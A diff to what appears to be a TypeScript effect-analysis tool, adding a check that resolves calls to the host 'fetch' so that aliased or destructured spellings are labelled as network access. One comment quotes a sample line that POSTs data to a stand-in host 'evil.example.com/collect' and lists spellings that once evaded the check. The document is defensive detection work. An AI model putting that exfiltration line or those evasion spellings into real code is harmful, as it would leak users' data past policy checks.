@@ -5426,6 +5426,62 @@ const envTouchingBuiltinCall = (node) => {
   return false;
 };
 
+/** ⟨R95⟩ Does this CALL reach the host's `fetch`, whatever the callee is spelled as?
+ *
+ * The declaration-keyed twin of the callee-keyed guards in the global classifier (see the arm that uses
+ * it for the five spellings those guards missed). Four conditions, each one load-bearing:
+ *
+ *  1. AMBIENT FUNCTION NAMED `fetch`. The host's fetch is a bodyless `function fetch` declaration:
+ *     `@types/node`'s `web-globals/fetch.d.ts` inside its `declare global` block (what `types: ["node"]`
+ *     supplies, so the common case), lib.dom's `declare function fetch`, or an older @types/node's
+ *     `globals.d.ts`. Keying on the FILE would have to enumerate those three and would go stale with the
+ *     next @types/node layout — this shape does not.
+ *     THE `d.body` HALF IS A SCOPE STATEMENT, NOT A PROVEN GUARANTEE, and is written down as the
+ *     assumption it is: it keeps this arm off DEPENDENCY IMPLEMENTATIONS, where "returns
+ *     `Promise<Response>`" is a weak signal (a pure `function fetch(u) { return new Response(u) }` has
+ *     that exact type), leaving those to the import arm above and the κ/invisible channel that already
+ *     own them. No fixture drives it: every dep-source shape tried was already charged Net by an
+ *     earlier arm, so deleting it changed nothing measurable. Narrower than the alternative, which is
+ *     the side to be wrong on here.
+ *  2. NOT A PROJECT FILE. A project's own `fetch` shadow must never fabricate Net — control 3, and the
+ *     same test every arm above makes.
+ *  3. NOT REACHED THROUGH A RELATIVE IMPORT. Same rule and same reasoning as the import arm above:
+ *     the module SPECIFIER decides, not file-set membership, so `import { fetch } from "./my-mock"`
+ *     stays the project's own even when the scan's shape leaves `./my-mock` outside `projectFiles`.
+ *     THE TEST IS ON THE CALLEE'S HEAD IDENTIFIER, not on the callee, and that is not cosmetic — the
+ *     first cut of this guard checked `call.expression` only, so it skipped every PropertyAccess and
+ *     `import * as shim from "./vendorshim"; shim.fetch(u)` FABRICATED Net on the project's own shim
+ *     while the named form beside it correctly gained nothing. Found by asking, of my own guard, the
+ *     question this fix is about: does it key on a spelling where it should key on a binding.
+ *  4. SHAPED LIKE THE WEB FETCH — returns `Promise<Response>`. Not a new judgement: it is the identical
+ *     question the import arm above already asks of the identical authority, and it exists because a
+ *     package exporting a pure `fetch(key)` cache-getter was once charged Net on its name alone.
+ *
+ * NOT a `.d.ts` file test: an ambient declaration is what (1) already asks for, and a file-extension
+ * test would add a second, weaker spelling of the same question. */
+const resolvedIsHostFetch = (call) => {
+  if (!ts.isCallExpression(call)) return false;
+  let sig; try { sig = checker.getResolvedSignature?.(call); } catch { return false; }
+  const d = sig?.declaration;
+  if (!d || !ts.isFunctionDeclaration(d) || d.body) return false;               // (1)
+  if (d.name?.text !== "fetch") return false;                                   // (1)
+  if (projectFiles.has(path.resolve(d.getSourceFile().fileName))) return false;  // (2)
+  let head = call.expression;                                                    // (3)
+  while (ts.isPropertyAccessExpression(head) || ts.isParenthesizedExpression(head)
+         || ts.isAsExpression(head) || ts.isNonNullExpression(head)) head = head.expression;
+  if (ts.isIdentifier(head)) {
+    for (const sd of checker.getSymbolAtLocation(head)?.declarations ?? []) {
+      const imp = ts.isImportSpecifier(sd) ? sd.parent?.parent?.parent
+                : ts.isImportClause(sd) ? sd.parent
+                : ts.isNamespaceImport(sd) ? sd.parent?.parent : null;
+      const spec = imp && ts.isImportDeclaration(imp) ? imp.moduleSpecifier : null;
+      if (spec && ts.isStringLiteralLike(spec) && /^[./]/.test(spec.text)) return false;
+    }
+  }
+  let rt; try { rt = checker.typeToString(checker.getReturnTypeOfSignature(sig)); } catch { return false; }
+  return /\bResponse\b/.test(rt);                                                // (4)
+};
+
 // A bare-identifier call whose callee is DEFAULT- or NAMED-imported from a known HTTP-client package is a
 // Net call (corpus-audit #13). The κ table lists these packages, but its rule only fires on a MEMBER call
 // (`axios.get(…)`); a default-imported callable invoked bare — the canonical `import fetch from 'node-fetch';
@@ -6549,6 +6605,35 @@ function visitCalls(node) {
     // `eval` global-qualifier handling (a runtime global a project would not shadow).
     else if (ctext === "globalThis.fetch" || ctext === "window.fetch" || ctext === "self.fetch")
       geff = "Net";
+    // ⟨R95⟩ …AND EVERY OTHER SPELLING, BY ASKING THE RESOLVED DECLARATION INSTEAD OF THE CALLEE.
+    //
+    // Every arm above keys on the CALLEE's own identity — its node text, or its symbol's declaration
+    // file. That question has now been wrong in five spellings, all MEASURED silent at 0b360d4 and all
+    // five confirmed to reach the network by executing them against a localhost listener:
+    //
+    //     const { fetch } = globalThis;      fetch(u)      const { fetch: f } = globalThis;  f(u)
+    //     const g = globalThis;              g.fetch(u)    (0, fetch)(u)
+    //     const a = [fetch];                 a[0](u)
+    //
+    // Each one binds `fetch` to a declaration INSIDE a project file — a BindingElement, a
+    // VariableDeclaration — which is precisely what the shadow guard above reads as "the project's own
+    // fetch", so the guard withheld Net. `deny Net`, `deny Unknown`, `deny Net Unknown`, `pure`, and
+    // both scoped forms all answered exit 0, `policy ✓`, 0 effectful functions over
+    //     const { fetch } = globalThis;
+    //     await fetch("https://evil.example.com/collect", { method: "POST", body: data });
+    //
+    // `crypto` does NOT have this hole, and the difference is the MECHANISM, not the effect: its arms
+    // key on the RESOLVED DECLARATION (the es-lib `parent === "Crypto"` arm below, and κ's
+    // `web-globals/crypto` rule), so a destructured `crypto` still resolves to `Crypto.randomUUID` and
+    // is charged. Converge on that rather than patching the identity gate a sixth time — brief §G, ask
+    // the authority: the checker already knows which function this call reaches, and it answers the
+    // same for all five spellings above (verified: one declaration, `web-globals/fetch.d.ts:23`).
+    //
+    // ADDITIVE, and last in the chain on purpose. Every arm above keeps priority, so no call that is
+    // Net today can stop being Net and no host capture below changes for a call that already matched
+    // (the previous ts fix in this vein REPLACED a resolution where it should have unioned, and cost
+    // hono's `hc` its `Clock`). This arm can only ADD Net to calls that are reported PURE today.
+    else if (resolvedIsHostFetch(node)) geff = "Net";
     // An alias chain this helper stopped following is an UNRESOLVED callee, not a pure one.
     if (un.truncated) { const o = enclosing(node); if (o) fns.get(o).direct.add("Unknown"); }
     if (geff) {
